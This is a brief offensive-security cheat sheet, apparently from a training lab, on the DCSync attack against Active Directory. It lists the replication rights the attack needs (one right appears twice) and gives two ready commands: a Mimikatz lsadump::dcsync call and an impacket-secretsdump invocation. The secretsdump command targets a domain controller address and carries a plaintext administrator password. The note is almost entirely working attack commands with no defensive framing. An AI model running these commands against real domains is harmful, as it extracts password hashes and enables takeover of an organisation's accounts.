#activedirectory #windows 

Needs the rights

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes 

#### Mimikatz

```mimikatz
lsadump::dcsync /user:corp\dave
```

#### Impacket

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

